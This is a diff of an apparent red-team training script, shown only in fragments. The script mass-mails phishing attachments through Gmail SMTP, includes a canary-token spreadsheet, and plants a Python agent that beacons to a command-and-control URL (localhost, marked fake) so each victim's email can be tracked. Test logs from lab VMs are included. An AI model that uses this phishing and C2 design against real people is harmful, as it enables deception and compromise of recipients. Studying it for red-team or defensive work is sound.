@@ -5,16 +5,16 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
-
+#Fake C2 Server
 C2_SERVER_URL = 'http://127.0.0.1/log'
 payload=["email.csv", "Software_Tracking_List.xlsx"]
 
 """
-For this script I am assuming that when the payload is executed and downloaded on the target machine, my C2 server will recieve POST requests from the target machine.
+For this script I am assuming that when the payload is executed and downloaded on the target machine, my C2 server will recieve POST requests from the target machine agent that was issued through the payload.
 I randomized the timing of the POST requests coming from the target machine between 1-60 seconds.
 In addition to this, I included a canary token (Software_Tracking_List.xlsx) in the email which will send me an email alert if the Excel sheet is downloaded.
-Lastly I created a python file that when ran will report back to the C2 server that the agent is online. For the python script, this is what I imagine would be under the hood of the executable where the 
-agent installed through the .exe would periodically be sent back to the C2.
+Lastly I created a python file that when ran, will report back to the C2 server that the agent is online. For the python script, this is what I imagine would be under the hood of the executable where the 
+agent installed through the .exe would periodically be sent back to the C2. With this python payload, I'm able to determine which email the agent is associated with.
 
 """
 
@@ -27,7 +27,7 @@ def read_email(username, password):
             msg = craft_email(username, email, payload)
             send_email(username, password, email, msg)
             
-            #log_agent_presence(email)           
+                 
         except Exception as e:
             print(f"Failed to craft email: {e}")
     
@@ -53,7 +53,7 @@ def craft_email(username, email, payload):
     msg['To'] = recipient
     msg['Subject'] = subject
     msg.attach(MIMEText(body, 'plain'))
-    # Open the payload as a binary
+    # Open each file and attach it to the email
     for file in payload:
         with open(file, "rb") as file_attachment:
             attachment = MIMEBase("application", "octet-stream")
@@ -64,8 +64,13 @@ def craft_email(username, email, payload):
         
     return msg
         
+'''
+For the email, I am just assuming I have a gmail account that is not associated with me but only used for red team activities. In actual red teamiung I would use my personal smtp server
+but for this script I am just going with gmail.
+'''
 
 def send_email(username, password, email, msg):
+    #I am using googles smpt server to send the email
     smtp_server = 'smtp.gmail.com'
     smtp_port = 587
     try:  
@@ -77,6 +82,10 @@ def send_email(username, password, email, msg):
     except Exception as e:
         print(f"Failed to send email: {e}")
 
+'''
+I'm assuming having the C2 server address listed like it is in the payload is bad form, but I wanted to demonstrate how the agent would be sending POST requests to the C2 server and created this 
+so I could install the payload on a VM and then recieve the POST requests on my server during testing.
+'''
 
 def python_payload(email):
     
@@ -122,8 +131,8 @@ def main():
     
 
 """
-On 2 VMs I accessed different test emails to download and run the python script.
-Example logs collected from my server showing alerts that were generated: 
+On 2 VMs I accessed different test email accounts where I recieved and ran the python script and other email attachments.
+Example logs collected from my C2 server showing alerts that were generated on the server: 
 
 Agent ben1234@icloud.com is online.
 10.0.0.132 - - [05/Nov/2024 10:41:46] "POST /log HTTP/1.1" 200 -
@@ -132,6 +141,7 @@ Agent ben.1234@gmail.com is online.
 
 """
 
+"""Decided to have fun with this script and give it a name!"""
 
 art = r"""
  ____                                  __                           
